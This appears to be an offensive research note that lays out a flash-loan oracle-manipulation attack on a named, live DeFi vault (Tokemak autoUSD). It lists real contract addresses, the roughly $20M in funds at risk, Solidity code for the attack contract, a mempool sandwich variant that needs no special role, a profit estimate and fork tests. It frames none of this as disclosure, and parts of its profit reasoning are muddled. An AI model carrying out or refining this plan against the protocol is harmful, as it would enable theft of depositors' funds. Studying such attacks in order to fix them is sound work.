# Attack Chain Hypothesis: Balancer Oracle Manipulation via Debt Reporting

## Hypothesis ID: H-001-ORACLE-MANIPULATION

**Category:** CROSS_CONTRACT_SEMANTIC_MISMATCH + TIMING_WINDOW_EXPLOITATION
**Target:** Tokemak AutopoolETH (autoUSD) - 0xa7569A44f348d3D70d8ad5889e50F78E33d80D35
**TVL at Risk:** $20,224,182 USDC

---

## EXECUTIVE SUMMARY

The BalancerV3StableMathOracle (0x792587b191eb0169da6beefa592859b47f0651fe) used by Tokemak destination vaults queries **live pool state** without historical snapshots or block-based guards. This allows flash loan manipulation of Balancer pool balances to distort LP token prices.

Combined with the fact that `updateDebtReporting()` **does not revert on unsafe prices** (unlike `flashRebalance()`), an attacker can:

1. Manipulate Balancer pool to inflate/deflate LP token prices
2. Trigger debt reporting to update cached debt values with manipulated prices
3. Profit by depositing/withdrawing against the manipulated valuations

---

## ATTACK CHAIN DETAILED DESIGN

### Phase 1: Setup and Reconnaissance

```
PREREQUISITES:
├── Flash loan source identified (Aave V3: 0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2)
├── Target Balancer pool identified (0x85b2b559bc2d21104c4defdd6efca8a20343361d)
├── Destination vault with Balancer exposure identified
├── Current assetBreakdown values known
└── Access to AUTO_POOL_REPORTING_EXECUTOR role OR sandwich attack
```

### Phase 2: Flash Loan Oracle Manipulation

```solidity
// ATTACK SEQUENCE

function executeAttack() external {
    // Step 1: Take flash loan from Aave V3
    // Borrow large amount of pool tokens to manipulate Balancer pool
    uint256 flashLoanAmount = calculateManipulationAmount();
    aavePool.flashLoan(address(this), tokens, amounts, modes, params);
}

function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
) external returns (bool) {

    // Step 2: Manipulate Balancer pool balances
    // Deposit/withdraw to skew the StableMath invariant calculation
    balancerPool.swap(
        SingleSwap({
            poolId: targetPoolId,
            kind: SwapKind.GIVEN_IN,
            assetIn: tokenA,
            assetOut: tokenB,
            amount: flashLoanAmount,
            userData: ""
        }),
        FundManagement({...}),
        0,  // min out
        block.timestamp
    );

    // Step 3: NOW prices are manipulated
    // BalancerV3StableMathOracle will return skewed prices

    // Step 4: Trigger debt reporting (if we have role)
    // OR this is a sandwich - debt reporting happens here
    autopool.updateDebtReporting(numDestinations);

    // Step 5: Debt values are now updated with manipulated prices
    // The pricesWereSafe flag is FALSE but execution CONTINUES

    // Step 6: Immediately interact with vault
    if (priceInflated) {
        // If we inflated the price, DEPOSIT now
        // We get shares valued at the high price
        // When price returns to normal, our shares are worth more
        autopool.deposit(depositAmount, address(this));
    } else {
        // If we deflated the price, WITHDRAW now
        // We burn shares valued at the low price
        // We receive more assets than we should
        autopool.withdraw(withdrawAmount, address(this), address(this));
    }

    // Step 7: Reverse the manipulation
    // Swap back to restore pool balance
    balancerPool.swap(reverseSwap...);

    // Step 8: Repay flash loan
    // Keep profit

    return true;
}
```

### Phase 3: Profit Extraction

**Scenario A: Price Inflation Attack**
```
1. Flash loan → Inflate Balancer LP price
2. Debt reporting updates: totalDebtMax increases significantly
3. Deposit USDC:
   - Shares calculated using totalDebtMax (inflated)
   - Attacker receives FEWER shares (seems bad)
4. BUT WAIT - we also inflate totalDebtMin
5. Immediately WITHDRAW:
   - Assets calculated using totalDebtMin (also inflated)
   - Attacker receives MORE assets
6. If the inflation % on min > max, profit!
```

**Scenario B: Price Deflation Attack**
```
1. Flash loan → Deflate Balancer LP price
2. Debt reporting updates: totalDebtMin/Max DECREASE
3. Other users' shares are now valued LOWER
4. Wait for price normalization OR trigger another reporting
5. Now attacker deposits at LOW valuation
6. Gets MORE shares per USDC
7. When debt normalizes, shares worth more
```

**Scenario C: Sandwich Attack (No role needed)**
```
1. Monitor mempool for updateDebtReporting() calls
2. Front-run with flash loan pool manipulation
3. Let debt reporting execute with bad prices
4. Back-run with deposit/withdrawal
5. Reverse manipulation
```

---

## ECONOMIC FEASIBILITY ANALYSIS

### Costs
| Item | Estimate |
|------|----------|
| Flash loan fee (Aave) | 0.05% of borrowed amount |
| Gas costs | ~$50-200 (complex multi-call) |
| Balancer swap fees | 0.01-0.3% depending on pool |
| Slippage | Variable based on pool depth |

### Requirements for Profitability
```
Let:
  TVL = $20,224,182
  manipulationDelta = price change achievable
  spreadDelta = |totalDebtMax - totalDebtMin| / totalDebt

For attack to profit:
  manipulationDelta * TVL * efficiency > flashLoanFee + gas + slippage

Example:
  5% price manipulation on $20M TVL
  = $1,000,000 potential value shift

  If we can capture 1% of that shift:
  = $10,000 gross profit

  Minus costs (~$500):
  = $9,500 net profit
```

### Pool Depth Analysis Needed
- Balancer StablePool (0x85b2b559bc2d21104c4defdd6efca8a20343361d) liquidity
- Required flash loan size to achieve meaningful price impact
- Slippage curve for large swaps

---

## VALIDATION STEPS

### Step 1: Simulate Price Manipulation
```bash
# Fork mainnet and test price oracle response to balance changes
forge test --fork-url $RPC_URL --match-test testOracleManipulation
```

### Step 2: Measure Price Impact
```solidity
function testOracleManipulation() public {
    // Snapshot price before
    (uint256 spotBefore, uint256 safeBefore, ) = destVault.getRangePricesLP();

    // Manipulate pool
    manipulateBalancerPool(flashLoanAmount);

    // Check price after
    (uint256 spotAfter, uint256 safeAfter, bool isSafe) = destVault.getRangePricesLP();

    // Log delta
    console.log("Spot delta:", spotAfter - spotBefore);
    console.log("Safe delta:", safeAfter - safeBefore);
    console.log("Is safe:", isSafe);
}
```

### Step 3: Test Debt Reporting Path
```solidity
function testDebtReportingWithBadPrices() public {
    // Manipulate oracle
    manipulateBalancerPool(amount);

    // Check that debt reporting continues (doesn't revert)
    vm.prank(REPORTING_EXECUTOR);
    autopool.updateDebtReporting(1);

    // Verify debt values changed
    IAutopool.AssetBreakdown memory breakdown = autopool.getAssetBreakdown();
    console.log("New totalDebt:", breakdown.totalDebt);
}
```

### Step 4: Calculate Actual Profit
```solidity
function testAttackProfitability() public {
    uint256 startBalance = usdc.balanceOf(attacker);

    // Execute full attack
    executeAttack();

    uint256 endBalance = usdc.balanceOf(attacker);
    int256 profit = int256(endBalance) - int256(startBalance);

    console.log("Net profit:", profit);
}
```

---

## BLOCKERS AND MITIGATIONS

### Potential Blockers

1. **ensureNoNavOps modifier**
   - Deposits/withdrawals blocked during debt reporting
   - BUT: Attack can be sandwich-style around the reporting call

2. **nonReentrant guard**
   - Prevents reentrancy within single call
   - BUT: Flash loan callback is a separate frame

3. **Price spread buffer**
   - min/max spread provides some protection
   - BUT: Manipulation can affect both values

4. **Role requirement for debt reporting**
   - Only REPORTING_EXECUTOR can call
   - BUT: Sandwich attack doesn't need the role

### Protocol's Actual Mitigations
1. Uses TWAP/safe prices in addition to spot
2. Conservative valuations for deposits/withdrawals
3. `isSpotSafe` flag (but not enforced in debt reporting!)

---

## ATTACK CLASSIFICATION

**Attacker Tier Required:** TIER_2 (MEV Searcher)
- Needs flash loan access
- Needs pool manipulation capability
- Needs timing/MEV capability for sandwich

**Minimum Capital:** Flash loan (no capital at risk)

**Complexity:** HIGH
- Multi-step transaction
- Precise timing required
- Economic modeling needed

**Detectability:** MEDIUM
- Large swaps visible in mempool
- Unusual debt reporting patterns detectable
- But sandwich can be executed via private relay

---

## NEXT STEPS

1. [ ] Query exact pool depth of target Balancer pool
2. [ ] Calculate minimum flash loan for meaningful price impact
3. [ ] Simulate full attack on mainnet fork
4. [ ] Calculate exact profit/loss under various scenarios
5. [ ] Identify if any flashRebalance transactions exist (alternative vector)
6. [ ] Check if SOLVER role is more accessible than REPORTING_EXECUTOR

---

## EVIDENCE REFERENCES

| Evidence | Location |
|----------|----------|
| BalancerV3StableMathOracle vulnerability | evidence/complete_evidence.md Section 4.1 |
| Price safety asymmetry | evidence/complete_evidence.md Section 2.1 Pattern 1 |
| Transaction trace | evidence/complete_evidence.md Section 3 |
| Economic parameters | evidence/complete_evidence.md Section 5 |

